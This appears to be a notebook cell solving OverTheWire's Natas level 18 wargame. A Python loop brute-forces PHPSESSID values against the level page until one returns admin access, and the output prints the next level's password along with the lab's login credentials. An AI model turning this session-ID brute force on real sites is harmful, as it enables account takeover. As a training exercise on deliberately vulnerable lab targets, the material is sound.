# %%
import requests

url = f'http://natas18.natas.labs.overthewire.org/index.php?debug=1&username=admin&password=test'
for i in range(1, 641):
    cookies = dict(PHPSESSID=str(i))
    result = requests.get(url, auth=("natas18", "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq"), cookies=cookies)
    if 'Username: natas19' in result.text:
        print(len(result.text))
        print(result.text)
        break
    print(f'testing session id {i}')
# Out:
# testing session id 1
# testing session id 2
# testing session id 3
# testing session id 4
# testing session id 5
# testing session id 6
# testing session id 7
# testing session id 8
# testing session id 9
# testing session id 10
# testing session id 11
# testing session id 12
# testing session id 13
# testing session id 14
# testing session id 15
# testing session id 16
# testing session id 17
# testing session id 18
# testing session id 19
# testing session id 20
# testing session id 21
# testing session id 22
# testing session id 23
# testing session id 24
# testing session id 25
# testing session id 26
# testing session id 27
# testing session id 28
# testing session id 29
# testing session id 30
# testing session id 31
# testing session id 32
# testing session id 33
# testing session id 34
# testing session id 35
# testing session id 36
# testing session id 37
# testing session id 38
# testing session id 39
# testing session id 40
# testing session id 41
# testing session id 42
# testing session id 43
# testing session id 44
# testing session id 45
# testing session id 46
# testing session id 47
# testing session id 48
# testing session id 49
# testing session id 50
# testing session id 51
# testing session id 52
# testing session id 53
# testing session id 54
# testing session id 55
# testing session id 56
# testing session id 57
# testing session id 58
# testing session id 59
# testing session id 60
# testing session id 61
# testing session id 62
# testing session id 63
# testing session id 64
# testing session id 65
# testing session id 66
# testing session id 67
# testing session id 68
# testing session id 69
# testing session id 70
# testing session id 71
# testing session id 72
# testing session id 73
# testing session id 74
# testing session id 75
# testing session id 76
# testing session id 77
# testing session id 78
# testing session id 79
# testing session id 80
# testing session id 81
# testing session id 82
# testing session id 83
# testing session id 84
# testing session id 85
# testing session id 86
# testing session id 87
# testing session id 88
# testing session id 89
# testing session id 90
# testing session id 91
# testing session id 92
# testing session id 93
# testing session id 94
# testing session id 95
# testing session id 96
# testing session id 97
# testing session id 98
# testing session id 99
# testing session id 100
# testing session id 101
# testing session id 102
# testing session id 103
# testing session id 104
# testing session id 105
# testing session id 106
# testing session id 107
# testing session id 108
# testing session id 109
# testing session id 110
# testing session id 111
# testing session id 112
# testing session id 113
# testing session id 114
# testing session id 115
# testing session id 116
# testing session id 117
# testing session id 118
# 1051
# <html>
# <head>
# <!-- This stuff in the header has nothing to do with the level -->
# <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
# <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
# <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
# <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
# <script>var wechallinfo = { "level": "natas18", "pass": "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq" };</script></head>
# <body>
# <h1>natas18</h1>
# <div id="content">
# DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas19
# Password: 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>
#
# {}
